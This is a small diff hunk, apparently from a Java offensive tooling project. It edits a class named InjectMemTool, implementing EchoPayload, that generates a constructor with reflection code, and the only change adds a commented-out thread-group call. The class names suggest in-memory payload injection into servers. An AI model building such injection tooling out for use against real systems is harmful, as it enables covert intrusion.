@@ -123,7 +123,7 @@ public class InjectMemTool implements EchoPayload {
                 "        f.setAccessible(true);\n" +
                 "        return f.get(o);\n" +
                 "}", clazz));
-
+        // Thread.currentThread().getThreadGroup()
         clazz.addConstructor(CtNewConstructor.make("public InjectMemTool() {\n" +
                 "        try {\n" +
                 "            Object o;\n" +
